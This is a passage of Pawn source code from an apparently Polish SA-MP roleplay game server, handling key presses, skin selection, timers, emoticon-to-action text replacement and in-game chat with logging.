				if(PlayerCache[playerid][pUID] != ObjectCache[objuid][oOwner])
				return TextDrawForPlayerEx(playerid, 1, "Brak uprawnien.", 3000);
			}
			if(ObjectCache[objuid][oOwnerType] == 2)
			{
				new guid = ObjectCache[objuid][oOwner];
				if(PlayerCache[playerid][pGroup] == guid)
				{

				}
				else if(PlayerCache[playerid][pGroup2] == guid)
				{
					
				}
				else if(PlayerCache[playerid][pGroup3] == guid)
				{
					
				}
				else
				return TextDrawForPlayerEx(playerid, 1, "Brak uprawnien.", 3000);
			}
			GetDynamicObjectPos(objectid, ox, oy, oz);
			GetDynamicObjectRot(objectid, rx, ry, rz);
			if(ox == ObjectCache[objuid][oX]+ObjectCache[objuid][oGateX] && oy ==  ObjectCache[objuid][oY]+ObjectCache[objuid][oGateY]  && oz ==ObjectCache[objuid][oZ]+ObjectCache[objuid][oGateZ] && rx == ObjectCache[objuid][orX]+ObjectCache[objuid][oGaterX] && ry == ObjectCache[objuid][orY]+ObjectCache[objuid][oGaterY] && rz == ObjectCache[objuid][orZ]+ObjectCache[objuid][oGaterZ])
			{
				TextDrawForPlayerEx(playerid, 1, "Brama ~r~~h~zamknieta~w~.", 3000);
				return MoveDynamicObject(objectid,ObjectCache[objuid][oX], ObjectCache[objuid][oY], ObjectCache[objuid][oZ], 4.1,  ObjectCache[objuid][orX],  ObjectCache[objuid][orY],  ObjectCache[objuid][orZ]);
			}
			MoveDynamicObject(objectid,ObjectCache[objuid][oX]+ObjectCache[objuid][oGateX], ObjectCache[objuid][oY]+ObjectCache[objuid][oGateY], ObjectCache[objuid][oZ]+ObjectCache[objuid][oGateZ], 4.1,  ObjectCache[objuid][orX]+ObjectCache[objuid][oGaterX],  ObjectCache[objuid][orY]+ObjectCache[objuid][oGaterY],  ObjectCache[objuid][orZ]+ObjectCache[objuid][oGaterZ]);
			return TextDrawForPlayerEx(playerid, 1, "Brama ~g~~h~otwarta.~w~.", 3000);
		}
	}*/
	
	else if(newkeys & KEY_FIRE)
	{
		if(IsPlayerInAnyVehicle(playerid))
		{
			new vid = GetPlayerVehicleID(playerid);
			if(GetPlayerVehicleSeat(playerid) != 0)
			return 1;
			if( PlayerCache[playerid][pCurrentVehicle][vLights])
			return SetVehicleParamsEx(vid,  PlayerCache[playerid][pCurrentVehicle][vEngine],  PlayerCache[playerid][pCurrentVehicle][vLights]=0,  PlayerCache[playerid][pCurrentVehicle][vAlarm],  PlayerCache[playerid][pCurrentVehicle][vDoors],  PlayerCache[playerid][pCurrentVehicle][vBonnet],  PlayerCache[playerid][pCurrentVehicle][vBoot],  PlayerCache[playerid][pCurrentVehicle][vObjective]);
			return SetVehicleParamsEx(vid,  PlayerCache[playerid][pCurrentVehicle][vEngine],  PlayerCache[playerid][pCurrentVehicle][vLights]=1,  PlayerCache[playerid][pCurrentVehicle][vAlarm],  PlayerCache[playerid][pCurrentVehicle][vDoors],  PlayerCache[playerid][pCurrentVehicle][vBonnet],  PlayerCache[playerid][pCurrentVehicle][vBoot],  PlayerCache[playerid][pCurrentVehicle][vObjective]);
		}
		new lib[32], name[32], index;
		index = GetPlayerAnimationIndex(playerid);
		GetAnimationName(index, lib, sizeof(lib), name, sizeof(name));
		if(pCantClearAnim[playerid] == false)
		{
			for(new i; i<MAX_ANIMS; i++)
			{
				if(!Isnull(AnimList[i][aName]))
				{
					if(!strcmp(AnimList[i][aName], name, true) && !strcmp(AnimList[i][aLib], lib, true))
					{
						return ClearAnimations(playerid);
					}
				}
			}
		}
		if(ObjectCache[playerid][oUID])
		{
			if(!strcmp(name, "gnstwall_injurd", true))
			return ClearAnimations(playerid);
			return ApplyAnimation(playerid, "swat", "gnstwall_injurd", 4.1, 0, 0, 0, 1, 0, 0);
		}
		return 1;
	}
	else if(newkeys & KEY_WALK && newkeys & KEY_SPRINT)
	{
		new vw = GetPlayerVirtualWorld(playerid);
	/*	for(new i; i<LastdUID; i++)
		{
			if(!DoorCache[i][dDestroyed])
			{
				if(IsPlayerInRangeOfPoint(playerid, 1.5, DoorCache[i][dOutX], DoorCache[i][dOutY], DoorCache[i][dOutZ]))
				{
					if(vw == DoorCache[i][dOutVW])
					{
						if(!DoorCache[i][dOpen])
						{
							SendPlayerMe(playerid, "poci¹ga za klamkê od drzwi.");
							TextDrawForPlayerEx(playerid, 1, "~r~Te drzwi sa zamkniete.", 3000);
							return 1;
						}
						if(DoorCache[i][dEnterCost] > 0)
						{
							if(PlayerCache[playerid][pCash] < DoorCache[i][dEnterCost])
							return TextDrawForPlayerEx(playerid, 1, "~r~~h~Brak gotowki na przejscie.", 3000);
							PlayerCache[playerid][pCash] -= DoorCache[i][dEnterCost];
							GivePlayerMoney(playerid, -DoorCache[i][dEnterCost]);
							GroupCache[DoorCache[i][dGroupUID]][gBank] += DoorCache[i][dEnterCost];
						}
						if(pChangeInterior[playerid])
						return TextDrawForPlayerEx(playerid, 1, "Odczekaj chwile przed kolejnym przejsciem.", 3000);
						pChangeInterior[playerid] = true;
						SetTimerEx("DisableInterior", 3000, false, "i", playerid);
						if(pFreeze[playerid])
						Freeze(playerid, 2000);
						else if(!pFreeze[playerid] && GetPlayerSpeed(playerid))
						TextDrawForPlayerEx(playerid, 1, "Przechodzac przez interior spadasz pod mape? Przejdz do: ~y~/stats -> ustawienia postaci~w~ i ~n~Przelacz ~g~~h~freeze~w~ przy przejsciu przez drzwi.", 10000);
						SetPlayerVirtualWorld(playerid, DoorCache[i][dInsVW]);
						Teleport(playerid, DoorCache[i][dInsX], DoorCache[i][dInsY], DoorCache[i][dInsZ]);
						Streamer_Update(playerid);
						if(!Isnull(DoorCache[i][dUrl]))
						PlayAudioStreamForPlayer(playerid, DoorCache[i][dUrl]);
						PlayerTextDrawHide(playerid, TextDrawDoorInfo[playerid]);
						if(GroupCache[DoorCache[i][dGroupUID]][gType] == 7)
						TextDrawForPlayerEx(playerid, 1, "Znajdujesz sie w sklepie calodobowym.~n~Uzyj ~g~~h~/kup~w~ by wyswietlic liste wszystkich przedmiotow do kupienia.", 7500);
						SetPlayerFacingAngle(playerid, DoorCache[i][dFacingAngle]);
						SetCameraBehindPlayer(playerid);
						return 1;
					}
				}
				if(IsPlayerInRangeOfPoint(playerid, 1.5, DoorCache[i][dInsX], DoorCache[i][dInsY], DoorCache[i][dInsZ]))
				{
					if(vw == DoorCache[i][dInsVW])
					{
						if(!DoorCache[i][dOpen])
						{
							SendPlayerMe(playerid, "poci¹ga za klamkê od drzwi");
							TextDrawForPlayerEx(playerid, 1, "~r~Te drzwi sa zamkniete.", 3000);
							return 1;
						}
						if(PlayerCache[playerid][pJailTime])
						{
							SendPlayerMe(playerid, "poci¹ga za klamkê od drzwi");
							TextDrawForPlayerEx(playerid, 1, "~r~~h~Jestes przetrzymywany.", 3000);
							return 1;
						}
						if(pChangeInterior[playerid])
						return TextDrawForPlayerEx(playerid, 1, "Odczekaj chwile przed kolejnym przejsciem przez drzwi.", 3000);
						pChangeInterior[playerid] = true;
						SetTimerEx("DisableInterior", 3000, false, "i", playerid);
						if(pFreeze[playerid])
						Freeze(playerid, 3000);
						SetPlayerVirtualWorld(playerid, DoorCache[i][dOutVW]);
						Teleport(playerid, DoorCache[i][dOutX], DoorCache[i][dOutY], DoorCache[i][dOutZ]);
						StopAudioStreamForPlayer(playerid);
						Streamer_Update(playerid);
						return 1;
					}
					
				}
			}
		}
		*/
	}
	return 1;
}

forward DisableInterior(playerid);
public DisableInterior(playerid)
{
	pChangeInterior[playerid] = false;
}

stock Freeze(playerid, time)
{TogglePlayerControllable(playerid, 0); SetTimerEx("Unfreeze", time, false, "i", playerid); return 1;}

forward Unfreeze(playerid);
public Unfreeze(playerid)
TogglePlayerControllable(playerid, 1);

stock IsPosInRangeOfPos(Float:PosX, Float:PosY, Float:PosZ, Float:TargetX, Float:TargetY, Float:TargetZ, Float:range)
{
	if(PosX >= TargetX-range && PosX <= TargetX+range || PosY >= TargetY-range && PosY <= TargetY+range || PosZ >= TargetZ-range && PosZ <= TargetZ+range)
	return 1;
	return 0;
}

public OnPlayerCommandPerformed(playerid, cmd[], params[], result, flags)
{
	printf("[UID: %d] [CMD: %s %s] [PLAYER: %s ID: %d]", PlayerCache[playerid][pUID], cmd, params, ReturnPlayerName(playerid), playerid);
	if(result==-1)
	return PlayerPlaySound(playerid, 1085, 0.0, 0.0, 0.0);
	return 1;
}

forward ChooseSkin(playerid);
public ChooseSkin(playerid)
{
	new ud, lr, keys;
	GetPlayerKeys(playerid, keys, ud, lr);
	if(lr == KEY_LEFT)
	{
		PlayerPlaySound(playerid, 1084, 0.0, 0.0, 0.0);
		if(PlayerCache[playerid][pGender])
		{
			SetPrevFemaleSkin(playerid);
		}
		else
		{
			SetPrevMaleSkin(playerid);
		}
	}
	else if(lr == KEY_RIGHT)
	{
		PlayerPlaySound(playerid, 1083, 0.0, 0.0, 0.0);
		if(PlayerCache[playerid][pGender])
		{
			SetNextFemaleSkin(playerid);
		}
		else
		{
			SetNextMaleSkin(playerid);
		}
	}
	else if(keys & KEY_WALK)
	{
		ChooseSkinTimer[playerid] = KillTimer(ChooseSkinTimer[playerid]);
		PlayerCache[playerid][pSkin] = GetPlayerSkin(playerid);
		TogglePlayerControllable(playerid, 1);
		SetCameraBehindPlayer(playerid);
		SetPlayerPos(playerid, 1021.1641,-1311.5492,13.5469);
		SetPlayerVirtualWorld(playerid, 0);
		ShowDialogInfo(playerid, ""HEX_BLUE"Witaj na Szkodniku!\n\n"HEX_WHITE"Stworzy³eœ/aœ w³aœnie now¹ postaæ, s³owami wstêpu:\n\nUdaj siê do "HEX_BLUE"urzêdu"HEX_WHITE" miasta by wyrobiæ dokumenty osobiste, nastêpnie do "HEX_GREEN"banku"HEX_WHITE",\nw celu wyrobienia karty kredytowej.\nKiedy ju¿ to wszystko zrobisz, poszukaj zatrudnienia w jakimœ biznesie. Popytaj ludzi o pracê.\n\nJeœli dalej potrzebujesz pomocy - skorzystaj z komendy /pomoc. Mi³ej gry!");
		PlayerCache[playerid][pTutorialLevel] = 0;
		PlayerTextDrawHide(playerid, BottomTextDraw[playerid]);

		new query[86];
		format(query, sizeof(query), "UPDATE players SET tutorialLevel = '0', skin = '%d' WHERE uid = '%d'", GetPlayerSkin(playerid), PlayerCache[playerid][pUID]);
		mysql_query(DB_HANDLE, query, false);
	}
}

stock SetNextMaleSkin(playerid)
{
	for(new i=GetPlayerSkin(playerid)+1; i <= LAST_MALE_SKIN+1; i++)
	{
		if(i == LAST_MALE_SKIN+1)
		{
			SetPlayerSkin(playerid, FIRST_MALE_SKIN);
			break;
		}
		if(i == 18 || i == 17 || i == 19 || i == 20 || i == 21 || i == 23 || i == 240 || i == 250 || i == LAST_MALE_SKIN-1)
		{
			SetPlayerSkin(playerid, i);
			break;
		}
	}
}


stock SetNextFemaleSkin(playerid)
{
	for(new i=GetPlayerSkin(playerid)+1; i <= LAST_FEMALE_SKIN+1; i++)
	{
		if(i == LAST_FEMALE_SKIN+1)
		{
			SetPlayerSkin(playerid, FIRST_FEMALE_SKIN);
			break;
		}
		if(i == 12 || i == 40 || i == 41 || i == 56 || i == 63 || i == 69 || i == 75 || i == 76 || i == LAST_FEMALE_SKIN)
		{
			SetPlayerSkin(playerid, i);
			break;
		}
	}
}

stock SetPrevMaleSkin(playerid)
{
	for(new i=GetPlayerSkin(playerid)-1; i >= FIRST_MALE_SKIN-2; i--)
	{
		if(i == FIRST_MALE_SKIN-1)
		{
			SetPlayerSkin(playerid, LAST_MALE_SKIN-1);
			break;
		}
		if(i == 18 || i == 17 || i == 19 || i == 20 || i == 21 || i == 23 || i == 240 || i == 250 || i == LAST_MALE_SKIN)
		{
			SetPlayerSkin(playerid, i);
			break;
		}
	}
}

stock SetPrevFemaleSkin(playerid)
{
	for(new i=GetPlayerSkin(playerid)-1; i >= FIRST_FEMALE_SKIN-1; i--)
	{
		if(i == FIRST_FEMALE_SKIN-1)
		{
			SetPlayerSkin(playerid, LAST_FEMALE_SKIN);
			break;
		}
		if(i == 12 || i == 40 || i == 41 || i == 56 || i == 63 || i == 69 || i == 75 || i == 76 || i == FIRST_FEMALE_SKIN)
		{
			SetPlayerSkin(playerid, i);
			break;
		}
	}
}

public OnPlayerSpawn(playerid)
{
	if(PlayerCache[playerid][pTutorialLevel]){
		TogglePlayerControllable(playerid, 0);
	}
	GetPlayerPos(playerid, pGlobalX[playerid],  pGlobalY[playerid],  pGlobalZ[playerid]);
	if(!pLogged[playerid])
	return Kick(playerid);
	return 1;
}

stock LookForEmoji(const str[])
{
	new msg[258]; format(msg, sizeof(msg), str);
	new pos;

	while(strfind(msg, ":)", true) != -1)
    {
        pos = strfind(msg, ":)", true);
        strdel(msg, pos, pos+2);
        strins(msg, "*uœmiecha siê*",pos);
    }
    while(strfind(msg, ":]", true) != -1)
    {
        pos = strfind(msg, ":]", true);
        strdel(msg, pos, pos+2);
        strins(msg, "*uœmiecha siê*",pos);
    }
    while(strfind(msg, "C:", true) != -1)
    {
        pos = strfind(msg, "C:", true);
        strdel(msg, pos, pos+2);
        strins(msg, "*uœmiecha siê*",pos);
    }
    while(strfind(msg, "c:", true) != -1)
    {
        pos = strfind(msg, "c:", true);
        strdel(msg, pos, pos+2);
        strins(msg, "*uœmiecha siê*",pos);
    }
    while(strfind(msg, "=]", true) != -1)
    {
        pos = strfind(msg, "=]", true);
        strdel(msg, pos, pos+2);
        strins(msg, "*uœmiecha siê*",pos);
    }
    while(strfind(msg, "=)", true) != -1)
    {
        pos = strfind(msg, "=)", true);
        strdel(msg, pos, pos+2);
        strins(msg, "*uœmiecha siê*",pos);
    }
    while(strfind(msg, "C=", true) != -1)
    {
        pos = strfind(msg, "C=", true);
        strdel(msg, pos, pos+2);
        strins(msg, "*uœmiecha siê*",pos);
    }
    while(strfind(msg, ":>", true) != -1)
    {
        pos = strfind(msg, ":>", true);
        strdel(msg, pos, pos+2);
        strins(msg, "*uœmiecha siê*",pos);
    }
    while(strfind(msg, "<:", true) != -1)
    {
        pos = strfind(msg, "<:", true);
        strdel(msg, pos, pos+2);
        strins(msg, "*uœmiecha siê*",pos);
    }
	while(strfind(msg, ";)", true) != -1)
    {
        pos = strfind(msg, ";)", true);
        strdel(msg, pos, pos+2);
        strins(msg, "*puszcza oczko*",pos);
    }
    while(strfind(msg, ";]", true) != -1)
    {
        pos = strfind(msg, ";]", true);
        strdel(msg, pos, pos+2);
        strins(msg, "*puszcza oczko*",pos);
    }
    while(strfind(msg, "C;", true) != -1)
    {
        pos = strfind(msg, "C;", true);
        strdel(msg, pos, pos+2);
        strins(msg, "*puszcza oczko*",pos);
    }
    while(strfind(msg, "c;", true) != -1)
    {
        pos = strfind(msg, "c;", true);
        strdel(msg, pos, pos+2);
        strins(msg, "*puszcza oczko*",pos);
    }
    while(strfind(msg, "<;", true) != -1)
    {
        pos = strfind(msg, "<;", true);
        strdel(msg, pos, pos+2);
        strins(msg, "*puszcza oczko*",pos);
    }
    while(strfind(msg, ";>", true) != -1)
    {
        pos = strfind(msg, ";>", true);
        strdel(msg, pos, pos+2);
        strins(msg, "*puszcza oczko*",pos);
    }
	while(strfind(msg, ":(", true) != -1)
    {
        pos = strfind(msg, ":(", true);
        strdel(msg, pos, pos+2);
        strins(msg, "*smuci siê*",pos);
    }
    while(strfind(msg, ":[", true) != -1)
    {
        pos = strfind(msg, ":[", true);
        strdel(msg, pos, pos+2);
        strins(msg, "*smuci siê*",pos);
    }
    while(strfind(msg, ":C", true) != -1)
    {
        pos = strfind(msg, ":C", true);
        strdel(msg, pos, pos+2);
        strins(msg, "*smuci siê*",pos);
    }
    while(strfind(msg, ":c", true) != -1)
    {
        pos = strfind(msg, ":c", true);
        strdel(msg, pos, pos+2);
        strins(msg, "*smuci siê*",pos);
    }
    while(strfind(msg, ":<", true) != -1)
    {
        pos = strfind(msg, ":<", true);
        strdel(msg, pos, pos+2);
        strins(msg, "*smuci siê*",pos);
    }
    while(strfind(msg, ">:", true) != -1)
    {
        pos = strfind(msg, ">:", true);
        strdel(msg, pos, pos+2);
        strins(msg, "*smuci siê*",pos);
    }
	while(strfind(msg, ";(", true) != -1)
    {
        pos = strfind(msg, ";(", true);
        strdel(msg, pos, pos+2);
        strins(msg, "*p³acze*",pos);
    }
    while(strfind(msg, ";[", true) != -1)
    {
        pos = strfind(msg, ";[", true);
        strdel(msg, pos, pos+2);
        strins(msg, "*p³acze*",pos);
    }
    while(strfind(msg, ";C", true) != -1)
    {
        pos = strfind(msg, ";C", true);
        strdel(msg, pos, pos+2);
        strins(msg, "*p³acze*",pos);
    }
    while(strfind(msg, ";c", true) != -1)
    {
        pos = strfind(msg, ";c", true);
        strdel(msg, pos, pos+2);
        strins(msg, "*p³acze*",pos);
    }
    while(strfind(msg, ";<", true) != -1)
    {
        pos = strfind(msg, ";<", true);
        strdel(msg, pos, pos+2);
        strins(msg, "*p³acze*",pos);
    }
    
    while(strfind(msg, ">;", true) != -1)
    {
        pos = strfind(msg, ">;", true);
        strdel(msg, pos, pos+2);
        strins(msg, "*p³acze*",pos);
    }
	while(strfind(msg, ":O", true) != -1)
    {
        pos = strfind(msg, ":O", true);
        strdel(msg, pos, pos+2);
        strins(msg, "*robi zdziwion¹ minê*",pos);
    }
	while(strfind(msg, ":o", true) != -1)
    {
        pos = strfind(msg, ":o", true);
        strdel(msg, pos, pos+2);
        strins(msg, "*robi zdziwion¹ minê*",pos);
    }
    
	while(strfind(msg, ";O", true) != -1)
    {
        pos = strfind(msg, ";O", true);
        strdel(msg, pos, pos+2);
        strins(msg, "*robi zdziwion¹ minê*",pos);
    }
    while(strfind(msg, ";o", true) != -1)
    {
        pos = strfind(msg, ";o", true);
        strdel(msg, pos, pos+2);
        strins(msg, "*robi zdziwion¹ minê*",pos);
    }
    while(strfind(msg, "O:", true) != -1)
    {
        pos = strfind(msg, "O:", true);
        strdel(msg, pos, pos+2);
        strins(msg, "*robi zdziwion¹ minê*",pos);
    }
    while(strfind(msg, "o:", true) != -1)
    {
        pos = strfind(msg, "o:", true);
        strdel(msg, pos, pos+2);
        strins(msg, "*robi zdziwion¹ minê*",pos);
    }
	while(strfind(msg, "O;", true) != -1)
    {
        pos = strfind(msg, "O;", true);
        strdel(msg, pos, pos+2);
        strins(msg, "*robi zdziwion¹ minê*",pos);
    }
    while(strfind(msg, "o;", true) != -1)
    {
        pos = strfind(msg, "o;", true);
        strdel(msg, pos, pos+2);
        strins(msg, "*robi zdziwion¹ minê*",pos);
    }
    while(strfind(msg, ":0", true) != -1)
    {
        pos = strfind(msg, ":0", true);
        strdel(msg, pos, pos+2);
        strins(msg, "*robi zdziwion¹ minê*",pos);
    }
	while(strfind(msg, ";0", true) != -1)
    {
        pos = strfind(msg, ";0", true);
        strdel(msg, pos, pos+2);
        strins(msg, "*robi zdziwion¹ minê*",pos);
    }
    while(strfind(msg, "0:", true) != -1)
    {
        pos = strfind(msg, "0:", true);
        strdel(msg, pos, pos+2);
        strins(msg, "*robi zdziwion¹ minê*",pos);
    }
    while(strfind(msg, "0;", true) != -1)
    {
        pos = strfind(msg, "0;", true);
        strdel(msg, pos, pos+2);
        strins(msg, "*robi zdziwion¹ minê*",pos);
    }
	while(strfind(msg, ":P", true) != -1)
    {
        pos = strfind(msg, ":P", true);
        strdel(msg, pos, pos+2);
        strins(msg, "*wystawia jêzyk*",pos);
    }
    while(strfind(msg, ":p", true) != -1)
    {
        pos = strfind(msg, ":p", true);
        strdel(msg, pos, pos+2);
        strins(msg, "*wystawia jêzyk*",pos);
    }
    while(strfind(msg, ";P", true) != -1)
    {
        pos = strfind(msg, ";P", true);
        strdel(msg, pos, pos+2);
        strins(msg, "*wystawia jêzyk*",pos);
    }
    while(strfind(msg, ";p", true) != -1)
    {
        pos = strfind(msg, ";p", true);
        strdel(msg, pos, pos+2);
        strins(msg, "*wystawia jêzyk*",pos);
    }
	while(strfind(msg, ":D", true) != -1)
    {
        pos = strfind(msg, ":D", true);
        strdel(msg, pos, pos+2);
        strins(msg, "*œmieje siê*",pos);
    }
	while(strfind(msg, ";D", true) != -1)
    {
        pos = strfind(msg, ";D", true);
        strdel(msg, pos, pos+2);
        strins(msg, "*œmieje siê*",pos);
    }
    while(strfind(msg, ">:(", true) != -1)
    {
        pos = strfind(msg, ">:(", true);
        strdel(msg, pos, pos+2);
        strins(msg, "*robi wœciek³¹ minê*",pos);
    }
    while(strfind(msg, ">:[", true) != -1)
    {
        pos = strfind(msg, ">:[", true);
        strdel(msg, pos, pos+2);
        strins(msg, "*robi wœciek³¹ minê*",pos);
    }
    while(strfind(msg, ">:c", true) != -1)
    {
        pos = strfind(msg, ">:c", true);
        strdel(msg, pos, pos+2);
        strins(msg, "*robi wœciek³¹ minê*",pos);
    }
    while(strfind(msg, ">;(", true) != -1)
    {
        pos = strfind(msg, ">;(", true);
        strdel(msg, pos, pos+2);
        strins(msg, "*robi wœciek³¹ minê*",pos);
    }
    while(strfind(msg, ">;[", true) != -1)
    {
        pos = strfind(msg, ">;[", true);
        strdel(msg, pos, pos+2);
        strins(msg, "*robi wœciek³¹ minê*",pos);
    }
	while(strfind(msg, ">;c", true) != -1)
    {
        pos = strfind(msg, ">;c", true);
        strdel(msg, pos, pos+2);
        strins(msg, "*robi wœciek³¹ minê*",pos);
    }
    
    while(strfind(msg, "):<", true) != -1)
    {
        pos = strfind(msg, "):<", true);
        strdel(msg, pos, pos+2);
        strins(msg, "*robi wœciek³¹ minê*",pos);
    }
    
    while(strfind(msg, "]:<", true) != -1)
    {
        pos = strfind(msg, "]:<", true);
        strdel(msg, pos, pos+2);
        strins(msg, "*robi wœciek³¹ minê*",pos);
    }
    while(strfind(msg, ");<", true) != -1)
    {
        pos = strfind(msg, ");<", true);
        strdel(msg, pos, pos+2);
        strins(msg, "*robi wœciek³¹ minê*",pos);
    }
    while(strfind(msg, "];<", true) != -1)
    {
        pos = strfind(msg, "];<", true);
        strdel(msg, pos, pos+2);
        strins(msg, "*robi wœciek³¹ minê*",pos);
    }
	while(strfind(msg, ":*", true) != -1)
    {
        pos = strfind(msg, ":*", true);
        strdel(msg, pos, pos+2);
        strins(msg, "*posy³a ca³usa*",pos);
    }
    while(strfind(msg, ";*", true) != -1)
    {
        pos = strfind(msg, ";*", true);
        strdel(msg, pos, pos+2);
        strins(msg, "*posy³a ca³usa*",pos);
    }
	while(strfind(msg, "?", true) != -1)
	{
		pos = strfind(msg, "?", true);
		strdel(msg, pos, pos+2);
		strins(msg, "*robi pytaj¹c¹ minê*",pos);
	}
	while(strfind(msg, ":d", true) != -1)
	{
		pos = strfind(msg, ":d", true);
		strdel(msg, pos, pos+2);
		strins(msg, "*œmieje siê*",pos);
	}
	while(strfind(msg, ":)", true) != -1)
	{
		pos = strfind(msg, ":)", true);
		strdel(msg, pos, pos+2);
		strins(msg, "*uœmiecha siê*",pos);
	}
	while(strfind(msg, ":(", true) != -1)
	{
		pos = strfind(msg, ":(", true);
		strdel(msg, pos, pos+2);
		strins(msg, "*smuci siê*",pos);
	}
	while(strfind(msg, ";(", true) != -1)
	{
		pos = strfind(msg, ";(", true);
		strdel(msg, pos, pos+2);
		strins(msg, "*smuci siê*",pos);
	}
	while(strfind(msg, ":p", true) != -1)
	{
		pos = strfind(msg, ":p", true);
		strdel(msg, pos, pos+2);
		strins(msg, "*wystawia jêzyk*",pos);
	}
	while(strfind(msg, ":o", true) != -1)
	{
		pos = strfind(msg, ":o", true);
		strdel(msg, pos, pos+2);
		strins(msg, "*robi zaskoczon¹ minê*",pos);
	}
	while(strfind(msg, "lel", true) != -1)
	{
		pos = strfind(msg, "lel", true);
		strdel(msg, pos, pos+3);
		strins(msg, "*wybucha œmiechem*",pos);
	}
	while(strfind(msg, "lol", true) != -1)
	{
		pos = strfind(msg, "lol", true);
		strdel(msg, pos, pos+3);
		strins(msg, "*wybucha œmiechem*",pos);
	}
	while(strfind(msg, ":d", true) != -1)
	{
		pos = strfind(msg, ":d", true);
		strdel(msg, pos, pos+2);
		strins(msg, "*œmieje siê*",pos);
	}
	while(strfind(msg, "xd", true) != -1)
	{
		pos = strfind(msg, "xd", true);
		strdel(msg, pos, pos+2);
		strins(msg, "*œmieje siê*",pos);
	}
	while(strfind(msg, ":/", true) != -1)
	{
		pos = strfind(msg, ":/", true);
		strdel(msg, pos, pos+2);
		strins(msg, "*krzywi siê*",pos);
	}
	while(strfind(msg, ":*", true) != -1)
	{
		pos = strfind(msg, ":*", true);
		strdel(msg, pos, pos+2);
		strins(msg, "*posy³a ca³usa*",pos);
	}
	while(strfind(msg, ":>", true) != -1)
	{
		pos = strfind(msg, ":>", true);
		strdel(msg, pos, pos+2);
		strins(msg, "*mró¿y oczy*",pos);
	}
	return msg;
}

stock SendFormattedMessage(playerid, const message[], const hexme[], const  hexnormal[], color)
{
	new hex[128]; format(hex, sizeof(hex), hexme); // hexme
	new hexnorm[128]; format(hexnorm, sizeof(hexnorm), hexnormal); // normal color hex

	new msg[525]; format(msg, sizeof(msg), message);
	if(strlen(msg) >= 100)
	{
		new msg1[128];
		format(msg1, sizeof(msg1), msg);
		strdel(msg1, 100, strlen(msg1));
		new msg2[128];
		format(msg2, sizeof(msg2), msg);
		strdel(msg2, 0, 100);
		format(msg1, sizeof(msg1), RPFormatText(msg1, hexme, hexnormal));
		format(msg2, sizeof(msg2), RPFormatText(msg2, hexme, hexnormal));
		SendClientMessage(playerid, color, LookForEmoji(msg1) );
		return SendClientMessage(playerid, color, LookForEmoji(msg2) );
	}
	return SendClientMessage(playerid, color, RPFormatText(LookForEmoji(msg), hexme, hexnormal));
}

stock RPFormatText(const message[], const hexme[],const hexnormal[])
{
	new hex[128]; format(hex, sizeof(hex), hexme); // hexme

	new hexnorm[128]; format(hexnorm, sizeof(hexnorm), hexnormal); // normal color hex

	new msg[256]; format(msg, sizeof(msg), message);

	new pos;

	new pos2;

	for(new i; i<strlen(msg); i++)
	{
		if(msg[i] == '*')
		{
			pos = i;
			break;
		}
	}

	for(new i=pos+1; i<strlen(msg); i++)
	{
		if(msg[i] == '*')
		{
			if(msg[i-1] == '*')
			continue;
			pos2 = i;
			if(msg[i+2] == '*')
			strins(msg, hexnorm, i+3);
			else if(msg[i+1] == '*')
			strins(msg, hexnorm, i+2);
			else if(msg[i] == '*')
			strins(msg, hexnorm, i+1);
			break;
		}
	}
	if(pos && pos2)
	{
		strins(msg, hex, pos-1);
	}
	return msg;
}

public OnPlayerText(playerid, text[])
{
	if(PlayerCache[playerid][pAJ_Time] || !PlayerCache[playerid][pUID])
	return 0;
	if(strfind(text, "pump up the jam", true) != -1){
		
		PumpUpTheJam[playerid] = true;
	}
	
	if(GetTickCount() - pTick[playerid] <= 250)
	{
		return !SendClientMessage(playerid, COLOR_GRAY, "Odczekaj chwilê przed ponownym wys³aniem wiadomoœci.");
	}
	// logs table
	
	new log[426];
	format(log, sizeof(log), "%s: %s", ReturnPlayerName(playerid), text);

	CreateLog(LOG_TYPE_GAME_CHAT, playerid, log);

	if(ac[playerid])
	{
		new msg[256];
		format(msg, sizeof(msg), "(( %s: %s ))", ReturnPlayerName(playerid), text);
		for(new i=0; i<=GetPlayerPoolSize();i++)
		{
			if(IsPlayerConnected(i))
			{
				if(PlayerCache[i][pUID])
				{
					if(PlayerCache[i][pLevel] >= ADMINISTRATION)
					{
						SendClientMessage(i, COLOR_DARKRED, msg);
					}
				}
			}
		}
		return 0;
	}
	if(PlayerCache[playerid][pBW_Time])
	return !SendClientMessage(playerid, COLOR_GRAY, "Nie mo¿esz nic mówiæ podczas BW.");
	if(text[0] == ':' && text[1] == 'd' || text[1] == 'D' && text[0] == ':')
	return !SendPlayerMe(playerid, "œmieje siê.");
	if(text[0] == 'x' && text[1] == 'd' || text[1] == 'D' && text[0] == 'X')
	return !SendPlayerMe(playerid, "œmieje siê.");
	if(text[0] == ':' && text[1] == ')')
	return !SendPlayerMe(playerid, "uœmiecha siê.");
	if(text[0] == ':' && text[1] == '(')
	return !SendPlayerMe(playerid, "smuci siê.");
	if(text[0] == ':' && text[1] == 'p')
	return !SendPlayerMe(playerid, "wystawia jêzyk.");
	if(text[0] == ':' && text[1] == 'P')
	return !SendPlayerMe(playerid, "wystawia jêzyk.");
	if(text[0] == ':' && text[1] == '>')
	return !SendPlayerMe(playerid, "mró¿y oczy.");
	if(text[0] == ':' && text[1] == '/')
	return !SendPlayerMe(playerid, "krzywi siê.");
	if(text[0] == ':' && text[1] == 'o')
	return !SendPlayerMe(playerid, "robi zaskoczon¹ minê");
	if(text[0] == ':' && text[1] == 'O')
	return !SendPlayerMe(playerid, "robi zaskoczon¹ minê");

	/*if(text[0] == '@')
	{
		new slot;
		if(text[1] == '1')
		{
			slot=1;
		}
		else if(text[1] == '2')
		{
			slot =2;
		}
		else if(text[1] == '3')
		{
			slot =3;
		}
		else
		{
			slot = 0;
		}
		if(slot < 1 || slot > 3)
		return !SendClientMessage(playerid, COLOR_GRAY, "Nieprawid³owy slot grupowy.");

		new groupuid;

		switch(slot)
		{
			case 1:
			{
				if(GroupCache[PlayerCache[playerid][pGroup]][gChatOOC] == false)
				return !SendClientMessage(playerid, COLOR_GRAY, "Czat OOC tej grupy jest wy³aczony.");
				groupuid = PlayerCache[playerid][pGroup];
			}
			case 2:
			{
				if(GroupCache[PlayerCache[playerid][pGroup2]][gChatOOC] == false)
				return !SendClientMessage(playerid, COLOR_GRAY, "Czat OOC tej grupy jest wy³aczony.");
				groupuid = PlayerCache[playerid][pGroup2];
			}
			case 3:
			{	
				if(GroupCache[PlayerCache[playerid][pGroup3]][gChatOOC] == false)
				return !SendClientMessage(playerid, COLOR_GRAY, "Czat OOC tej grupy jest wy³aczony.");
				groupuid = PlayerCache[playerid][pGroup3];
			}
		}
